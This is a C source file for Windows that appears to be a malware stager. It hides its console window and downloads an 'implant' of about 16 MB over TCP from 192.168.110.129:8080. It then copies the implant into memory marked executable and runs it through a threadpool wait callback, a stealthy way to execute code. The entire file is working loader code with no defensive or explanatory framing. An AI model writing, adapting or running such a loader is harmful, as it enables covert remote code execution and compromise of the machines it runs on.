#include "Ws2tcpip.h" 
#include <winsock2.h> 
#include <stdio.h>
#include <Windows.h>
#include <process.h>
#include <processthreadsapi.h>


#pragma comment(lib,"ws2_32.lib")
#define PAYLOAD_SIZE 15996216


void DownloadImplant();



unsigned char data[PAYLOAD_SIZE];


int main() {

    PVOID alloc;
    DWORD oldProtect = 0;
    HANDLE cr;
    HANDLE hProcess;
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    DownloadImplant();

    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
    LPVOID scodeAddress = VirtualAlloc(NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(scodeAddress, data, sizeof(data));

    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)scodeAddress, NULL, NULL);
    SetThreadpoolWait(threadPoolWait, event, NULL);
    WaitForSingleObject(event, INFINITE);

    return 0;

}


void DownloadImplant() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in cleanServer;
    int response_size;
    int total_received = 0;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {

        exit(1);
    }

  
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {

        exit(1);
    }

    InetPtonA(AF_INET, "192.168.110.129", &cleanServer.sin_addr.s_addr);
    cleanServer.sin_family = AF_INET; 
    cleanServer.sin_port = htons(8080);

    // Connect to server
    if (connect(s, (struct sockaddr*)&cleanServer, sizeof(cleanServer)) == SOCKET_ERROR) {

        closesocket(s);
        WSACleanup();
        exit(1);
    }

   
    while (total_received < PAYLOAD_SIZE) {
        response_size = recv(s, (char*)data + total_received, PAYLOAD_SIZE - total_received, 0);
        if (response_size == SOCKET_ERROR) {

            closesocket(s);
            WSACleanup();
            exit(1);
        }
        else if (response_size == 0) {
           

            break;
        }
        total_received += response_size;
    }



   
    closesocket(s);
    WSACleanup();
}



